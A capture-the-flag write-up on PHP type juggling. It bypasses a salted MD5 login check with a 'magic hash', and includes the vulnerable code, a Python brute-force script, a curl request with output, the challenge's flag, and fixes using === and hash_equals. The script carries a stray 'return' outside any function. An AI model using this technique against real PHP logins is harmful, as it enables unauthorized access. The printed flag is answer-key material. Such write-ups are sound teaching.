# CTF Write-up: PHP Type Juggling / MD5 Hash Collision Challenge

## Challenge Description
The challenge presents a PHP login page with the following code:
```php
<?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>
```

## Vulnerability Analysis

### 1. **Type Juggling Vulnerability**
The critical vulnerability is in this line:
```php
md5($salt . $_GET['password']) == $password_hash
```
PHP uses **loose comparison (`==`)** instead of **strict comparison (`===`)**.

### 2. **How PHP Loose Comparison Works**
In PHP, when comparing strings with `==`:
- If a string starts with `0e` (scientific notation: 0 × 10^...)
- And the rest of the string contains only digits
- PHP interprets it as the number `0`

Examples:
- `"0e123" == "0"` returns `true`
- `"0e902564435691274142490923013038" == 0` returns `true`
- `"0e902564435691274142490923013038" == "0e123456"` returns `true`

### 3. **The Attack Vector**
We need to find a password such that:
```
md5("f789bbc328a3d1a3" + password) = 0e[only digits]
```

When this happens:
- `md5(salt + password)` = `"0e[digits]"`
- `$password_hash` = `"0e902564435691274142490923013038"`
- PHP evaluates: `"0e[digits]" == "0e902564435691274142490923013038"` → `true`

## Solution Steps

### Step 1: Understand the Requirement
We need to brute-force a password where:
1. MD5 hash of `"f789bbc328a3d1a3" + password` starts with `"0e"`
2. The characters after `"0e"` are all digits (0-9)

### Step 2: Write Brute-Force Script
```python
import hashlib
import itertools
import string

salt = b"f789bbc328a3d1a3"
target_prefix = "0e"

# Try all combinations of letters and numbers
chars = string.ascii_letters + string.digits

# Try different password lengths
for length in range(1, 10):
    print(f"Trying passwords of length {length}...")
    for combo in itertools.product(chars, repeat=length):
        password = ''.join(combo).encode()
        full = salt + password
        md5_hash = hashlib.md5(full).hexdigest()
        
        # Check if hash starts with "0e" followed only by digits
        if md5_hash.startswith(target_prefix) and md5_hash[2:].isdigit():
            print(f"FOUND!")
            print(f"Password: {password.decode()}")
            print(f"Hash: {md5_hash}")
            return
```

### Step 3: Execute and Find Password
The script found:
- **Password**: `abr1R`
- **Hash**: `0e918704785736777877278345014851`
- **Verification**: `md5("f789bbc328a3d1a3abr1R") = 0e918704785736777877278345014851`

### Step 4: Exploit
Visit the URL with the password:
```
https://62f97b710f6bac6e.247ctf.com/?password=abr1R
```
┌──(obito㉿kali)-[~/ctf/247_ctf/web]
└─$ curl https://62f97b710f6bac6e.247ctf.com/?password=abr1R | grep 247CTF{.*}          
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1821 100   1821   0      0   2817      0                              0
247CTF{76fbce3909b3129536bb396fea3a9879}<code><span style="color: #000000">


### Step 5: Get Flag
The server evaluates:
```php
md5("f789bbc328a3d1a3abr1R") == "0e902564435691274142490923013038"
// Both evaluate to "0" in scientific notation comparison
// Result: true
```
Therefore, it outputs the flag:
```
247CTF{76fbce3909b3129536bb396fea3a9879}
```

## Prevention
To fix this vulnerability:
1. **Use strict comparison (`===`)** instead of loose comparison (`==`)
2. **Use password_hash() and password_verify()** for password storage
3. **Add a timing-safe comparison** if comparing hashes

```php
// Correct way:
if(isset($_GET['password']) && hash_equals(md5($salt . $_GET['password']), $password_hash)){
    echo $flag;
}
```

## Key Takeaways
1. **PHP type juggling** can lead to serious security vulnerabilities
2. **Always use `===`** for comparisons in PHP
3. **MD5 is cryptographically broken** and should not be used for security purposes
4. **Magic hashes** (hashes starting with `0e` followed by digits) can bypass loose comparison checks
5. **Salting alone doesn't prevent type juggling attacks** - the comparison method matters

This challenge demonstrates a classic PHP type juggling vulnerability that has been used in many real-world applications and CTF challenges.
